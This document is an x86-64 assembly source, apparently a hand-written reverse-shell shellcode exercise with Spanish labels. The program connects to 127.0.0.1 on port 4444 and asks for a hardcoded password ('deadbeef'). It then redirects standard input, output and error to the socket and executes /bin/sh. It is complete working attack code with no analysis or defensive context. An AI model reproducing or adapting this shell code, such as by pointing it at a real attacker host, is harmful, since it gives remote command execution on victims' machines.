
section .data

connect:
dw 0x0002
dw 0x5c11
dd 0x0100007f

password:

pedir_pass db "Dime la contraseña: ", 0xA
len_pass equ $ - pedir_pass
pass dq 0x6665656264616564

section .bss

resp resb 100 

section .text

global _start

_start:

xor rax, rax
xor rdi, rax
xor rsi, rax
xor rdx, rax

mov dil, 2
mov sil, 1
mov al, 41

syscall

test rax, rax
js salir

mov rdi, rax
mov r15, rax

xor rax, rax
mov rbx, rax
mov rdx, rax

sub rsp, 8

lea rbx, [connect]
mov ax, [rbx]
mov word [rsp], ax

mov ax, [rbx + 2]
mov word [rsp + 2], ax

mov eax, [rbx + 4]
mov dword [rsp + 4], eax

mov dl, 16
mov rsi, rsp
mov rax, 42

xor r8, r8
mov r9, r8
mov r10, r8

syscall

test rax, rax
js salir

volver_preguntar:

mov rdi, r15
mov rsi, pedir_pass
mov rdx, len_pass

mov rax, 44

syscall

test rax, rax
js salir

mov rdi, r15
mov rsi, resp
mov rdx, 100

mov rax, 45
syscall


xor rcx, rcx

mov rcx, [resp]
cmp rcx, [pass]
jne volver_preguntar

xor rsi, rsi
mov sil, 3

dups:

mov rax, 33
syscall

dec rsi
jns dups

xor rbx, rbx

push rbx
pop rdx

push rbx
pop rsi

mov rdi, 0x68732f6e69622f2f
shr rdi, 8
push rdi
push rsp

pop rdi

mov rax, 59
syscall

test rax, rax
js salir


salir:
xor rax, rax
xor rdi, rdi

mov al, 60     
syscall




